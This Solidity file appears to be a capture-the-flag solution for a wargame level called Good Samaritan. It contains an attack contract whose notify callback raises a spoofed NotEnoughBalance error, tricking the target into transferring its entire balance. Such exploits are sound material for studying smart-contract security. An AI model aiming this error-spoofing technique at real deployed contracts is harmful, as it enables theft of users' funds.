//SPDX-License-Identifier:MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function coin() external view returns (address);

    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances() external view returns (uint256);
}

contract GoodSamaritanAttack {
    IGoodSamaritan private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGoodSamaritan _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
